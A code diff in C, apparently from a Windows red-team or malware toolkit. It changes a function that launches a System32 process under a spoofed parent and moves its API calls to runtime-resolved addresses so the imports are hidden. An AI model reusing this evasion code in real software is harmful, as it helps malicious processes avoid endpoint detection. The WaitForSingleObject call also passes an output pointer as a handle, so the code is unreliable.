@@ -40,21 +40,24 @@ BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessI
 
 BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
 {
+	// Dynamic Links
+	f_WaitForSingleObject rWaitForSingleObject = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "WaitForSingleObject");
+	f_GetEnvironmentVariableA rGetEnvironmentVariableA = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "GetEnvironmentVariableA");
+	f_CreateProcessA rCreateProcessA = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "CreateProcessA");
+
 	// Inits
 	CHAR lpPath[MAX_PATH * 2];
 	CHAR WnDr[MAX_PATH];
 	CHAR lpWorkPath[MAX_PATH];
-	SIZE_T                             sThreadAttList = NULL;
-	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;
-	STARTUPINFOEXA                     SiEx = { 0 };
-	PROCESS_INFORMATION                Pi = { 0 };
+	SIZE_T sThreadAttList = NULL;
+	PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;
+	STARTUPINFOEXA SiEx = { 0 };
+	PROCESS_INFORMATION Pi = { 0 };
 
-	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
-	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
 	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
 	// Create spoofed path
-	GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH);
+	rGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH);
 	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
 	sprintf(lpWorkPath, "%s\\System32\\", WnDr);
 
@@ -69,7 +72,7 @@ BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT
 
 	// Create process with spoofed params
 	SiEx.lpAttributeList = pThreadAttList;
-	CreateProcessA(
+	rCreateProcessA(
 		NULL,
 		lpPath,
 		NULL,
@@ -81,7 +84,6 @@ BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT
 		&SiEx.StartupInfo,
 		&Pi
 	);
-	f_WaitForSingleObject rWaitForSingleObject = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "WaitForSingleObject");
 	rWaitForSingleObject(hThread, 1000);
 
 	// Returns and cleanup
